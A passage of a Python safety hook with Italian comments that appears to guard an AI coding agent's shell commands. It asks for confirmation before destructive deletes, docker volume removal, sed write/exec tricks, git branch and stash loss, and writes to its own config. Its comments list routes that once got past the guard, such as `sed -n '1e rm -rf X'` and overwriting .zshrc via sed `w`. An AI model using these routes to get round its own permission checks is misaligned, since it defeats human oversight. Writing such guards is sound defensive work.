        if ricorsivo and any(_CARTELLA_SEGRETA.search(a.rstrip("/") if a not in ("/",) else a) for a in letti):
            return True
    return False

# --- Docker distruttivo su volumi -> ask ---
DOCKER_DESTRUCTIVE_RE = re.compile(
    r"\bdocker\s+volume\s+rm\b|\bdocker\s+system\s+prune\b[^|]*--volumes",
    re.IGNORECASE,
)

BARE_TARGETS = {".", "./", "*", ".*", "*.*", "./*", ".//"}

# --- sed che SCRIVE col comando `w` -> ask ---
# Il comando `w` di sed scrive su file anche sotto `-n`, e anche come flag di `s///`:
# `sed -n 'w ~/.zshrc' x` sovrascrive .zshrc aggirando il deny Edit(~/.zshrc).
# Il carattere prima di `w` è "non alfanumerico" per coprire l'apice di 'w file',
# lo spazio di `; w file` e lo slash di `s/a/b/w file`. `[^|&]*` non attraversa una
# pipe, così `sed -n p x | grep w foo` non matcha.
SED_WRITE_RE = re.compile(r"(^|[\s;&|])sed\s[^|&]*[^A-Za-z0-9]w\s+[^\s|;&]", _RE_NOMI)
_SED_SCRIPT_W = re.compile(r"(^|[^A-Za-z0-9])w\s+[^\s|;&]")
# Il pattern e la sostituzione di s/// e y/// e gli indirizzi /re/ sono testo, non comandi (31/10/2026):
# `sed -i 's/if (w >= 700 \&\& w <= 1000) {/if (w <= 1000) {/' probe.cjs` sembrava una scrittura per la `w`
# del codice JavaScript. Si svuotano prima di cercare `w`; i flag di s/// restano, anche attaccati (`gw`).
_SED_S_CORPO = re.compile(r"(^|[;\n{}!\s\d$,])([sy])([^\w\s\\])((?:\\.|(?!\3)[^\\])*)\3((?:\\.|(?!\3)[^\\])*)\3")
_SED_INDIRIZZO = re.compile(r"(^|[;\n{}!\s,])/((?:\\.|[^/\\\n])*)/")
_SED_FLAG_W = re.compile(r"s([^\w\s\\])\1\1[gpiImMe0-9]*w")
# `1w file`, `$w file`, `2,5w file`: un indirizzo numerico attaccato a `w` (prima sfuggiva).
_SED_ADDR_W = re.compile(r"(^|[\s;{}!])(?:\d+|\$)(?:,(?:\d+|\$))?!?\s*w\s*[^\s|;&]")
# GNU sed esegue in shell il testo del comando `e` e quello del flag `e` di s/// (1/11/2026, F05):
# `sed -n '1e rm -rf X' f` cancellava senza conferma. Si cercano sullo script già svuotato.
_SED_CMD_E = re.compile(r"(^|[;\n{}!\s])(?:(?:\d+|\$|//)(?:,(?:\d+|\$|//))?!?\s*)?e(\s|$|;)")
_SED_FLAG_E = re.compile(r"s([^\w\s\\])\1\1[gpiImMw0-9]*e")


def _senza_corpi_sed(t: str) -> str:
    t = _SED_S_CORPO.sub(lambda m: m.group(1) + m.group(2) + m.group(3) * 3, t)
    return _SED_INDIRIZZO.sub(lambda m: m.group(1) + "//", t)


def _sed_esegue(command: str) -> bool:
    """`sed` che esegue un comando di shell col comando `e` o col flag `e` di s///."""
    for toks in _segmenti_parole(_testo_shell(command)):
        i = 0
        while i < len(toks) and (_ENV_ASSIGN_RE.match(toks[i]) or toks[i] in _SKIP_WRAPPERS):
            i += 1
        if i < len(toks) and _fc._nome(toks[i]) == "sed":
            script = _senza_corpi_sed(" ".join(toks[i + 1:]))
            if _SED_CMD_E.search(script) or _SED_FLAG_E.search(script):
                return True
    return False


def _sed_scrive(command: str) -> bool:
    """`sed` che scrive col comando `w`, cercato nel solo segmento di sed (15/10/2026).

    La regex sull'intero comando attraversava `;` e a capo:
    `sed -n 25,50p f; for w in a b` sembrava una scrittura. Dentro una shell
    annidata o un ssh il segmento resta intero e vale la regex di prima.
    """
    for toks in _segmenti_parole(_testo_shell(command)):
        i = 0
        while i < len(toks) and (_ENV_ASSIGN_RE.match(toks[i]) or toks[i] in _SKIP_WRAPPERS):
            i += 1
        if i >= len(toks):
            continue
        binario = _fc._nome(toks[i])
        if binario == "sed":
            script = _senza_corpi_sed(" ".join(toks[i + 1:]))
            if _SED_SCRIPT_W.search(script) or _SED_FLAG_W.search(script) or _SED_ADDR_W.search(script):
                return True
        if binario in _SHELLS | {"ssh", "eval", "xargs"} and SED_WRITE_RE.search(" ".join(toks)):
            return True
    return False

# Cartelle che uno strumento ricrea da solo: cancellarle non perde lavoro.
RIGENERABILI = {
    "node_modules", "dist", "build", "out", ".next", ".nuxt", ".svelte-kit",
    ".turbo", ".parcel-cache", ".cache", "coverage", "__pycache__",
    ".pytest_cache", ".mypy_cache", ".ruff_cache", ".venv", "venv", "target",
}

def _home():
    return os.path.expanduser("~")


def _projects_base():
    raw = os.environ.get("PROJECTS_BASE", "").strip()
    if raw:
        raw = raw.replace("${HOME}", _home()).replace("$HOME", _home())
        return os.path.normpath(os.path.expanduser(raw))
    return os.path.normpath(os.path.join(_home(), "Documents", "ClaudeCode"))


def _ask(regola, reason):
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "ask",
            "permissionDecisionReason": reason,
        }
    }))
    # Il dispatcher di Arturo chiede anche quale regola ha parlato: va nella telemetria come
    # block-dangerous.py.<regola>, così si vede quale chiede a vuoto (22/10/2026). Senza la
    # variabile l'uscita resta il solo JSON, come la legge la config dell'autore.
    if os.environ.get("ARTURO_REGOLA") == "1":
        print(f"REGOLA: {regola}")
    return 0


# Variabili shell nel target: `${VAR:-default}`, `${VAR}`, `$VAR`.
_VAR_RE = re.compile(r"\$\{([A-Za-z_][A-Za-z0-9_]*)(:?[-=])([^}]*)\}|\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)")
# Assegnazioni nel comando: `X=...`, `export X=... Y=...`. Il valore vale per il
# comando: `export D=$TMPDIR/prova; rm -rf $D` cancella una cartella temporanea.
_ASSEGNAZIONE_CMD_RE = re.compile(r"""(?:^|(?<=[\s;&|(]))([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|[^\s;&|()]*)""")
_ASSEGNAZIONE_MKTEMP_RE = re.compile(r"""(?:^|(?<=[\s;&|(]))([A-Za-z_][A-Za-z0-9_]*)=(?:"(\$\(\s*mktemp\b[^()`$;|&"]*\))"|(\$\(\s*mktemp\b[^()`$;|&"]*\)))""")
_ASSEGNATE = {}


def _assegnazioni(command):
    """Le variabili assegnate nel comando, in ordine (vince l'ultima), col valore grezzo."""
    trovate = []
    for m in _ASSEGNAZIONE_CMD_RE.finditer(command):
        grezzo = m.group(3) if m.group(3) is not None else (m.group(4) if m.group(4) is not None else m.group(2))
        trovate.append((m.start(), m.group(1), grezzo))
    # `tmp=$(mktemp -d)`: la regex sopra si ferma alla parentesi e lascia "$" (20/10/2026)
    for m in _ASSEGNAZIONE_MKTEMP_RE.finditer(command):
        trovate.append((m.start(), m.group(1), m.group(2) or m.group(3)))
    # La stessa posizione può comparire due volte (la regex generica e quella di mktemp): vince mktemp.
    per_posizione = {}
    for pos, nome, valore in trovate:
        if pos not in per_posizione or _MKTEMP_RE.match(valore or ""):
            per_posizione[pos] = (nome, valore)
    # Una variabile assegnata due volte con valori diversi non si risolve (1/11/2026, F06):
    # `S=~/Documents; cd "$S"; S=/tmp; rm -rf ClaudeCode` leggeva il cd col valore finale.
    out = {}
    for _, (nome, valore) in sorted(per_posizione.items()):
        out[nome] = None if (nome in out and out[nome] != valore) else valore
    # Legata anche fuori da NOME=valore (read, printf -v, for, mapfile, declare, +=): il valore dipende dal
    # punto del comando, e `read S <<< ~/Documents; cd "$S"; S=/tmp` leggeva il cd come /tmp (review del 1/11).
    for nome in _legate_altrove(command):
        if nome in out:
            out[nome] = None
    return out


_LEGA_ELENCO = re.compile(r"(?:^|[\s;&|(])(?:read|mapfile|readarray|declare|typeset|local|export|readonly)\b([^\n;&|)]*)")
_LEGA_UNA = re.compile(r"\bprintf\s+(?:-\S+\s+)*-v\s*([A-Za-z_]\w*)|(?:^|[\s;&|(])(?:for|select)\s+([A-Za-z_]\w*)"
                       r"|\bgetopts\s+\S+\s+([A-Za-z_]\w*)|(?<![\w$])([A-Za-z_]\w*)\+=")


def _legate_altrove(command):
    nomi = set()
    for m in _LEGA_ELENCO.finditer(command):
        nomi.update(re.findall(r"(?<![\w$=/.-])([A-Za-z_]\w*)(?![\w=])", m.group(1)))
    for m in _LEGA_UNA.finditer(command):
        nomi.update(g for g in m.groups() if g)
    return nomi


def _expand_vars(t):
    """Espande le variabili: prima quelle assegnate nel comando, poi l'ambiente
    dell'hook (quello della sessione: TMPDIR, HOME...). Restituisce None se resta
    qualcosa che non si risolve (`$(...)`, backtick, variabile non definita): un
    path che non si conosce non si giudica come sicuro."""
    def rep(m):
        name = m.group(1) or m.group(4) or m.group(5)
        if name in _ASSEGNATE and _ASSEGNATE[name] is None:
            return m.group(0)  # assegnata più volte: il valore dipende dal punto del comando
        if name in _ASSEGNATE and _MKTEMP_RE.match(_ASSEGNATE[name]):
            val = "/tmp/mktemp.XXXXXX"  # cartella appena creata da mktemp: vedi _MKTEMP_RE
        elif name in _ASSEGNATE:
            val = os.path.expanduser(_ASSEGNATE[name]) if _ASSEGNATE[name].startswith("~") else _ASSEGNATE[name]
        else:
            val = _home() if name == "HOME" else os.environ.get(name)
        if m.group(1):
            if val is None or (val == "" and m.group(2).startswith(":")):
                return m.group(3)
            return val
        return val if val is not None else m.group(0)
    for _ in range(3):  # il default può contenere a sua volta una variabile (${X:-$HOME/..})
        t2 = _VAR_RE.sub(rep, t)
        if t2 == t:
            break
        t = t2
    if "$" in t or "`" in t:
        return None
    return t


# `$(mktemp ...)` crea una cartella o un file nuovo e vuoto: cancellarlo non perde niente
# (7/9/2026, nella config dell'autore). Vale come un temporaneo.
_MKTEMP_RE = re.compile(r"^\$\(\s*mktemp\b[^()`$;|&]*\)$")


def _resolve(target, cwd):
    t = (target or "").strip().strip('"').strip("'")
    if not t:
        return None
    if _MKTEMP_RE.match(t):
        return os.path.normpath("/tmp/mktemp.XXXXXX")
    t = _expand_vars(t)
    if t is None:
        return None
    t = os.path.expanduser(t)
    # Su Windows Git Bash scrive il disco come `/c/Users/...`: per Python è `\c\Users`, fuori dalla
    # home, e `echo x > /c/Users/<io>/.claude/hooks/a.py` passava senza conferma (4/11/2026, #4790).
    if os.name == "nt":
        t = re.sub(r"^/([a-zA-Z])(?=/|$)", lambda m: m.group(1).upper() + ":", t)
    if not os.path.isabs(t):
        if cwd is None:
            return None  # cwd sconosciuto (cd verso un path che non si risolve): niente path inventati
        t = os.path.join(cwd, t)
    return os.path.normpath(t)


def _log_di_job(p):
    """True per la cartella di un job di bin/bgjob.sh (~/.claude/data/logs/bgjobs/<job>):
    log rigenerabili e ignorati da git (3/10/2026). La cartella bgjobs stessa no."""
    bgjobs = os.path.normpath(os.path.join(_home(), ".claude", "data", "logs", "bgjobs"))
    return bool(p) and p.startswith(bgjobs + os.sep)


def _is_protected_tree(p):
    if not p:
        return False
    if _log_di_job(p):
        return False
    # Su macOS e Windows il disco ignora le maiuscole: `rm -rf ~/.CLAUDE` cancella la config, e su Windows
    # Git Bash scrive `/c/users/...` (review del 9/11/2026, #5096).
    p = _piega(p)
    h = _piega(os.path.normpath(_home()))
    claude = _piega(os.path.normpath(os.path.join(_home(), ".claude")))
    base = _piega(_projects_base())
    if p == claude or p.startswith(claude + os.sep):
        return True
    if p == base:
        return True
    if os.path.dirname(p) == base:
        return True
    if p == h or p == os.path.normpath("/"):
        return True
    return False


def _protetto(regola, p):
    """True se il percorso risolto `p` cade su una voce di PERCORSI_PROTETTI con questa regola."""
    if not p:
        return False
    modo = _MAIUSCOLE[regola][0]
    piega = _piega if modo == "piega" else (lambda x: x)
    home = _home()
    p = piega(p)
    cartella, nome = os.path.dirname(p), os.path.basename(p)
    if modo == "nome":
        nome = nome.lower()
    for r, forma, percorso, _es, _ris in PERCORSI_PROTETTI:
        if r != regola:
            continue
        pezzi = percorso.split("/")
        if forma == "pezzo":
            pezzo = piega(os.sep + os.path.join(*pezzi))
            if (pezzo + os.sep) in p or p.endswith(pezzo):
                return True
            continue
        if forma == "nome-ovunque":
            if nome == piega(percorso):
                return True
            continue
        base = os.path.join(home, ".claude") if forma != "albero-home" else home
        if forma in ("nome-radice", "nome-cartella"):
            dove = piega(os.path.normpath(os.path.join(base, *pezzi[:-1])))
            if cartella == dove and fnmatch.fnmatchcase(nome, piega(pezzi[-1])):
                return True
            continue
        bersaglio = piega(os.path.normpath(os.path.join(base, *pezzi)))
        if p == bersaglio or (forma != "file-claude" and p.startswith(bersaglio + os.sep)):
            return True
    return False


def _under_claude_config(p):
    """True se il path reale cade su una voce `config` di PERCORSI_PROTETTI."""
    return _protetto("config", p)


def _piega(p):
    """Il percorso da confrontare: in minuscolo dove il disco ignora le maiuscole (macOS, Windows)."""
    return p.casefold() if p and sys.platform in ("darwin", "win32") else p


_BARRA_ROVESCIATA = re.compile(r"\\(?=[\w.~-])")


def _barre(testo, sempre=False):
    """Il testo con le barre dritte al posto di quelle rovesciate dei percorsi, solo su Windows (o con
    `sempre`, per il codice di cmd e powershell): le regex dei percorsi vogliono `/`, e
    `"C:\\Users\\x\\.ssh\\id_ed25519"` passava senza conferma (review del 9/11/2026, #5096). Restano
    `\\"`, `\\\\`, `\\$` e `\\|`, che per la shell non sono percorsi."""
    if not testo or not (sempre or os.name == "nt"):
        return testo
    return _BARRA_ROVESCIATA.sub("/", testo)


def _is_persistenza(p):
    """True se il path reale è un git hook o un file di avvio automatico."""
    return _protetto("avvio-automatico", p)


def _is_claude_md(p):
    return _protetto("claude-md", p)


def _is_claude_md_globale(p):
    """True per ~/.claude/CLAUDE.md e ~/.claude/CLAUDE.local.md."""
    return _is_claude_md(p) and os.path.dirname(p) == os.path.normpath(os.path.join(_home(), ".claude"))


def _preferenza(nome):
    """~/.claude/arturo/<nome>, o il vecchio ~/.claude/hooks/<nome> finché il nuovo manca (strati F1, #4531).
    La guardia non importa radici.py: un import fallito la spegnerebbe, perché un errore diverso
    dall'uscita 2 non blocca. Legge la home vera, la stessa su cui giudica i percorsi."""
    claude = os.path.join(_home(), ".claude")
    nuovo = os.path.join(claude, "arturo", nome)
    vecchio = os.path.join(claude, "hooks", nome)
    return vecchio if not os.path.exists(nuovo) and os.path.exists(vecchio) else nuovo


def _claude_md_progetto_libero():
    """True se protect_claude_md.local contiene la riga `allow claude-md-progetto`: la stessa
    scelta che protect_claude_md.py applica a Edit e Write (31/10/2026)."""
    try:
        with open(_preferenza("protect_claude_md.local"), encoding="utf-8") as fh:
            return any(riga.split("#", 1)[0].split() == ["allow", "claude-md-progetto"] for riga in fh)
    except OSError:
        return False


def _is_unlock(p):
    """True per un file di unlock: "unlock" nel nome, direttamente in ~/.claude."""
    return _protetto("sblocco", p)


_parola_shell = _fc.parola_shell


def _bersagli_redirezione(seg):
    """I file scritti dalle redirezioni del segmento: `>`, `>>`, `>|`, `N>`, `&>`, `&>>`, `<>` e `>&file`,
    con il bersaglio anche fra virgolette o attaccato alla parola. `>&N`, `>&-` e `>(...)` non scrivono un
    file. Lo scanner è `redirezioni` di forma_comando.py, lo stesso del ramo memoria (#5096, #5261)."""
    return [b for tipo, b in _fc.redirezioni(seg) if tipo == "scrive" and b]


# cp, mv, install, ln e rsync verso una cartella scrivono `cartella/nome-della-sorgente`: senza giudicare
# quel percorso, `cp /tmp/config-unlock-x ~/.claude/` creava lo sblocco senza conferma e
# `cp /tmp/x/settings.json ~/.claude/` riscriveva la config (review del 10/11/2026, #5261).
_COPIANO = frozenset("cp mv install ln rsync".split())


def _dentro_la_cartella(cmd0, toks, base_cwd):
    """I percorsi `destinazione/nome-sorgente` che cp, mv, install, ln e rsync scrivono quando la
    destinazione è una cartella: finisce con `/`, esiste come cartella, arriva da -t, o le sorgenti
    sono più di una. `ln` con un solo argomento crea il link nella cartella corrente."""
    liberi, cartella, i = [], None, 1
    while i < len(toks):
        t = toks[i]
        if t in ("-t", "--target-directory") and i + 1 < len(toks):
            cartella = toks[i + 1]
            i += 2
            continue
        if t.startswith("--target-directory="):
            cartella = t.partition("=")[2]
        elif not t.startswith("-"):
            liberi.append(t)
        i += 1
    if cartella is not None:
        sorgenti = liberi
    elif cmd0 == "ln" and len(liberi) == 1:
        cartella, sorgenti = ".", liberi
    elif len(liberi) >= 2:
        cartella, sorgenti = liberi[-1], liberi[:-1]
        risolta = _resolve(cartella, base_cwd)
        if not (len(sorgenti) > 1 or cartella.endswith(("/", "\\", "/.")) or cartella in (".", "..")
                or (risolta and os.path.isdir(risolta))):
            return []
    else:
        return []
    out = []
    for sorgente in sorgenti:
        # `cp -R src/. dest/` e `rsync src/ dest/` copiano il contenuto: contano i nomi dentro la sorgente.
        if sorgente in (".", "..") or sorgente.endswith(("/.", "\\.")) or (
                cmd0 == "rsync" and sorgente.endswith(("/", "\\"))):
            try:
                dentro = os.listdir(_resolve(sorgente, base_cwd) or "")[:500]
            except OSError:
                dentro = []
            out.extend(os.path.join(cartella, nome) for nome in dentro)
            continue
        nome = os.path.basename(sorgente.rstrip("/\\"))
        if nome and nome not in (".", ".."):
            out.append(os.path.join(cartella, nome))
    return out


def _writes_config(command, cwd, protetto=None, sed=True, cancella=False, crea=False):
    """Copre `cd ~/.claude/hooks && > file` (target relativo dopo un cd): il match
    testuale di CONFIG_WRITE_RE vede solo i path assoluti che contengono `.claude/`.
    Qui si traccia il cd per segmento e si risolve il target reale del redirect/binario.
    `protetto` sceglie cosa si cerca: di default _under_claude_config, oppure un altro predicato sul
    percorso risolto (_is_persistenza, _is_unlock, o una lambda sui CLAUDE.md).
    Con `cancella` contano anche rm, unlink e shred: senza settings.json cadono deny e hook alla
    ricarica (finding 11). I wrapper davanti (`command cp`, `sudo tee`) si saltano, e perl -i
    scrive come sed -i. Con `crea` conta anche mkdir: serve alla regola sblocco, dove una cartella
    col nome dello sblocco non deve nascere senza conferma (#5261)."""
    protetto = protetto or _under_claude_config
    cwd_decl = None
    for seg in _fc.comandi_semplici(command):
        seg = seg.strip()
        if not seg:
            continue
        try:
            toks = shlex.split(seg)
        except Exception:
            toks = seg.split()
        if not toks:
            continue
        if toks[0] == "cd" and len(toks) >= 2:
            cwd_decl = _resolve(toks[1], cwd_decl or cwd)
            continue
        base_cwd = cwd_decl or cwd
        # `git log --output=...` scrive quanto una redirezione: non può saltare
        # il controllo soltanto perché il binario si chiama git.
        for index, token in enumerate(toks):
            output = None
            if token.startswith("--output="):
                output = token.partition("=")[2]
            elif token == "--output" and index + 1 < len(toks):
                output = toks[index + 1]
            if output and protetto(_resolve(output, base_cwd)):
                return True
        # redirezioni verso un file, anche fra virgolette
        if any(protetto(_resolve(b, base_cwd)) for b in _bersagli_redirezione(seg)):
            return True
        # binario di scrittura con un target come argomento. Le redirezioni escono dalle parole: in
        # `cp x ~/.claude/ 2>/dev/null` l'ultimo argomento è la cartella, non `2>/dev/null` (#5261).
        try:
            toks = shlex.split(_fc._senza_tratti_redirezione(seg)) or toks
        except Exception:
            pass
        toks = _dopo_involucri(toks) or toks
        cmd0 = _fc._nome(toks[0])
        # L'rm ricorsivo ha la sua regola (rm-protetto), col messaggio giusto: qui solo i file singoli.
        if cancella and cmd0 in _CANCELLANO and not _fc._ricorsivo(toks[1:]):
            if any(protetto(_resolve(t, base_cwd)) for t in toks[1:] if not t.startswith("-")):
                return True
        if cmd0 in _WRITE_BINS:
            argomenti = [t for t in toks[1:] if not t.startswith("-")]
            # cp, install, rsync e ln scrivono solo l'ultimo argomento (la sorgente si legge),
            # salvo -t/--target-directory, che sposta la destinazione: allora contano tutti.
            if cmd0 in ("cp", "install", "rsync", "ln") and argomenti and not any(
                    t == "-t" or t.startswith("--target-directory") for t in toks[1:]):
                argomenti = argomenti[-1:]
            for t in argomenti:
                if protetto(_resolve(t, base_cwd)):
                    return True
        if cmd0 in _COPIANO:
            if any(protetto(_resolve(t, base_cwd)) for t in _dentro_la_cartella(cmd0, toks, base_cwd)):
                return True
        if crea and cmd0 == "mkdir":
            if any(protetto(_resolve(t, base_cwd)) for t in toks[1:] if not t.startswith("-")):
                return True
        # sed -i e perl -i sul file
        if sed and ((cmd0 in ("sed", "gsed") and "-i" in seg)
                    or (cmd0 == "perl" and any(re.match(r"^-[a-zA-Z]*i", t) for t in toks[1:]))):
            for t in toks[1:]:
                if not t.startswith("-") and protetto(_resolve(t, base_cwd)):
                    return True
    return False


def _temporaneo(p):
    """True per i path dentro una cartella temporanea del sistema: /tmp, /private/tmp, /var/folders,
    $TMPDIR, e su Windows %TEMP%, che sta dentro la home. Stessa regola di _temp() in
    attenua-personale.py e di volatile() in bin/inventario-sessione.py (#4547): la cartella
    temporanea stessa, o una che la contiene, non lo è (sul Mac $TMPDIR ha gli scratchpad di tutte le
    sessioni), e nemmeno la home, una sua antenata o i file di una HOME dentro una temporanea (i banchi)."""
    # Su Windows normpath scrive `\tmp\prova` e Git Bash `/c/Users`: il confronto si fa con le
    # barre dritte, la lettera del disco e, su Windows, senza maiuscole.
    def dritto(q):
        q = q.replace("\\", "/").rstrip("/")
        if os.name == "nt":
            q = re.sub(r"^/([a-zA-Z])(?=/|$)", r"\1:", q).lower()
        return q

    def sotto(a, b):
        return a == b or a.startswith(b + "/")
    p = dritto(p)
    h = dritto(_home())
    if sotto(h, p):
        return False  # la home, o una cartella che la contiene, non è mai temporanea
    radici = ["/tmp", "/private/tmp", "/var/folders", "/private/var/folders"]
    for nome in ("TMPDIR", "TEMP", "TMP"):
        if os.environ.get(nome, "").strip():
            radici.append(dritto(os.path.normpath(os.environ[nome])))
    if any(r and sotto(r, p) for r in radici):
        return False  # la cartella temporanea intera, o una che la contiene (2/11/2026, #4547)
    for r in radici:
        if r and sotto(p, r):
            if sotto(h, r) and sotto(p, h):
                continue  # i file di una HOME che sta in una cartella temporanea: i banchi
            return True
    return False


def _rigenerabile(p):
    """True se il path è una cartella che si ricrea da sola, o sta dentro una di esse."""
    if _log_di_job(p):
        return True
    parti = p.replace("\\", "/").split("/")
    return any(parte in RIGENERABILI for parte in parti)


def _forma():
    """forma_comando.py della stessa cartella, già caricato in testa al file."""
    return _fc


# Programmi che cancellano file come rm (31/10/2026: unlink e shred passavano da find -exec).
_CANCELLANO = frozenset(("rm", "unlink", "shred"))


# Programmi che ne lanciano un altro: `-exec env rm` cancella come `-exec rm` (1/11/2026, F07).
_INVOLUCRI = frozenset(_fc._WRAPPER | {"timeout", "time", "stdbuf", "ionice", "doas", "chrt", "taskset"})
# Le loro opzioni che prendono un valore staccato (`sudo -u utente`, `nice -n 5`, `timeout -s KILL`).
_INVOLUCRI_CON_VALORE = frozenset(("-u", "-g", "-n", "-p", "-C", "-h", "-U", "-s", "-k", "-c", "-o", "-e", "-i"))


def _dopo_involucri(args):
    """Gli argomenti dal programma vero in poi, saltando wrapper, opzioni, durate e assegnazioni."""
    i = 0
    while i < len(args):
        if _fc._nome(args[i]) in _INVOLUCRI:
            i += 1
            while i < len(args) and (args[i].startswith("-") or re.fullmatch(r"\d+(?:\.\d+)?[smhd]?", args[i])
                                     or _ENV_ASSIGN_RE.match(args[i])):
                i += 2 if args[i] in _INVOLUCRI_CON_VALORE else 1
            continue
        if _ENV_ASSIGN_RE.match(args[i]):
            i += 1
            continue
        break
    return args[i:]


# Le opzioni di xargs che prendono un valore staccato.
_XARGS_CON_VALORE = frozenset(("-I", "-n", "-P", "-L", "-l", "-d", "-E", "-e", "-s", "-a", "--max-args",
                               "--max-procs", "--max-lines", "--delimiter", "--eof", "--max-chars",
                               "--arg-file", "--replace"))


def _xargs_programma(args):
    """Gli argomenti di xargs dal programma che lancia in poi (1/11/2026, F08)."""
    i = 0
    while i < len(args) and args[i].startswith("-") and args[i] != "--":
        i += 2 if args[i] in _XARGS_CON_VALORE else 1
    if i < len(args) and args[i] == "--":
        i += 1
    return args[i:]


def _cancella_dentro(args) -> bool:
    """Vero se gli argomenti di -exec lanciano rm, unlink o shred, anche dietro un wrapper
    (env, sudo, command, nice) o dentro `sh -c '…'`."""
    args = _dopo_involucri(args)
    if not args:
        return False
    nome = _fc._nome(args[0])
    if nome in _CANCELLANO:
        return True
    codice = _forma().codice_shell(args[1:]) if nome in _SHELLS else None
    if codice is not None:
        return any(n in _CANCELLANO for n, _ in _forma().programmi(codice))
    return False


def _find_delete(command):
    """`find … -delete`, `find … -exec rm|unlink|shred` (anche dentro `-exec sh -c '…'`) e
    `find … | xargs rm` cancellano quanto un rm ricorsivo."""
    programmi = _forma().programmi(command)
    trova = False
    for nome, args in programmi:
        if nome != "find":
            continue
        trova = True
        if "-delete" in args:
            return True
        for i, t in enumerate(args[:-1]):
            if t in ("-exec", "-execdir", "-ok", "-okdir") and _cancella_dentro(args[i + 1:]):
                return True
    if trova:
        for nome, args in programmi:
            # Conta il programma che xargs lancia: `xargs grep -n rm` non cancella (F08).
            if nome == "xargs" and _cancella_dentro(_xargs_programma(args)):
                return True
    return False


# --- git branch -D e git stash drop (31/10/2026) ---
# Fino al 31/10 li bloccava un deny, che vince anche sulla regola autoMode che li permette quando non si
# perde niente. Ora decide la guardia: tace se il lavoro esiste altrove, altrimenti chiede.


def _git_parti(args):
    """(cartella di -C o None, sottocomando, argomenti dopo il sottocomando) di un `git …`."""
    i, cartella = 0, None
    while i < len(args) and args[i].startswith("-"):
        if args[i] == "-C" and i + 1 < len(args):
            cartella = args[i + 1]
        i += 2 if args[i] in _GIT_OPZIONI_CON_VALORE else 1
    if i >= len(args):
        return cartella, "", []
    return cartella, args[i], args[i + 1:]


def _git_esegui(repo, *argomenti):
    try:
        r = subprocess.run(["git", "-C", repo, *argomenti], capture_output=True, text=True, encoding="utf-8",
                           errors="replace", timeout=5, check=False)
    except (OSError, subprocess.SubprocessError):
        return None
    return r.stdout if r.returncode == 0 else None


def _ramo_altrove(repo, ramo, cancellati=frozenset()) -> bool:
    """Vero se i commit di `ramo` stanno in un ramo remoto o in un altro ramo locale che lo stesso
    comando non cancella. `--contains` riceve il ref pieno: un tag omonimo non lo devia (1/11/2026, F09)."""
    proprio = "refs/heads/" + ramo
    uscita = _git_esegui(repo, "branch", "-a", "--contains", proprio, "--format=%(refname)")
    if uscita is None:
        return False
    esclusi = {proprio} | {"refs/heads/" + r for r in cancellati}
    return any(r.strip() and r.strip() not in esclusi for r in uscita.splitlines())


def _lunga(lunghe, opzione) -> bool:
    """git accetta l'inizio non ambiguo di un'opzione lunga: `--forc` è `--force` (1/11/2026, F13)."""
    return any(len(o.split("=", 1)[0]) >= 3 and opzione.startswith(o.split("=", 1)[0]) for o in lunghe)


def _branch_cancella(resto):
    """(forzato, rami) di un `git branch …`: forzato se -D, -d -f, --delete --force o i loro prefissi."""
    corte = "".join(a[1:] for a in resto if a.startswith("-") and not a.startswith("--"))
    lunghe = [a for a in resto if a.startswith("--")]
    cancella = "d" in corte or "D" in corte or _lunga(lunghe, "--delete")
    forza = "D" in corte or (cancella and ("f" in corte or _lunga(lunghe, "--force")))
    return forza, [a for a in resto if not a.startswith("-")]


def _stash_ref(args):
    """La chiave dello stash nominato negli argomenti: `stash@{N}` o `N` danno N, nessuno dà 0."""
    for a in args:
        if a.startswith("-"):
            continue
        m = re.fullmatch(r"stash@\{(\d+)\}|(\d+)", a)
        if m:
            return int(m.group(1) or m.group(2))
        return a  # un ref che non è uno stash numerato: chiave a sé
    return 0


def _senza_redirezioni(args):
    """Gli argomenti senza le redirezioni (`> f`, `>f`, `2>/dev/null`) e il loro bersaglio."""
    fuori, salta = [], False
    for a in args:
        if salta:
            salta = False
        elif _REDIREZIONE_SOLA_RE.match(a):
            salta = True
        elif not _REDIREZIONE_RE.match(a):
            fuori.append(a)
    return fuori


def _worktree_perde(cartella, args, cds, cwd):
    """("git-worktree", motivo) se `git worktree remove` con -f/--force toglie un worktree con file
    modificati o nuovi: --force li cancella senza chiedere (segnalazione n. 55, 4/11/2026). Un worktree
    pulito, che non esiste o dove git status fallisce tace: git fallirebbe comunque. I file ignorati
    restano fuori (segnalazione n. 13): node_modules e cache darebbero una conferma a ogni remove."""
    puliti = _senza_redirezioni(args)
    corte = "".join(a[1:] for a in puliti if a.startswith("-") and not a.startswith("--"))
    lunghe = [a for a in puliti if a.startswith("--")]
    if "f" not in corte and not _lunga(lunghe, "--force"):
        return None
    percorsi = [a for a in puliti if not a.startswith("-")]
    if not percorsi:
        return None
    illeggibile = ("git-worktree", f"git worktree remove --force su {percorsi[0]}: la guardia non riesce a "
                   "risolvere il percorso. --force cancella i file non salvati in un commit: controlla con "
                   "`git -C <worktree> status` prima di confermare.")
    for base in _basi_dopo_cd(cds, cwd):
        repo = None if base is None else (_resolve(cartella, base) if cartella else base)
        wt = None if repo is None else _resolve(percorsi[0], repo)
        if wt is None:
            return illeggibile
        if not os.path.isdir(wt):
            continue
        stato = _git_esegui(wt, "status", "--porcelain")
        righe = [r[3:] for r in (stato or "").splitlines() if r.strip()]
        if righe:
            elenco = ", ".join(righe[:5]) + (f" e altri {len(righe) - 5}" if len(righe) > 5 else "")
            salvati = "salvato" if len(righe) == 1 else "salvati"
            return ("git-worktree", f"git worktree remove --force cancella {len(righe)} file non {salvati} in un "
                    f"commit nel worktree {percorsi[0]}: {elenco}. Salvali con un commit o copiali, poi togli "
                    "il worktree senza --force; conferma solo se non ti servono.")
    return None


def _git_perde_lavoro(command, cwd):
    """(regola, motivo) se il comando cancella un ramo con commit che non stanno altrove, o uno stash
    che lo stesso comando non salva prima. None se non perde niente.

    Uno stash conta come salvato solo se lo stesso comando ne scrive la patch su un file
    (`git stash show -p [ref] > file`) o lo tagga (`git tag nome stash@{N}`), e solo per quel ref
    (1/11/2026, F11 F12). `git stash branch` toglie già da solo lo stash che applica: il drop che segue
    ne butta un altro (F37). `git stash clear` li butta tutti. I rami cancellati dallo stesso comando
    non si coprono a vicenda (F10)."""
    programmi = list(_programmi_con_cd(command))
    cancellati = set()
    for nome, args, _cds in programmi:
        if nome == "git":
            _c, sotto, resto = _git_parti(args)
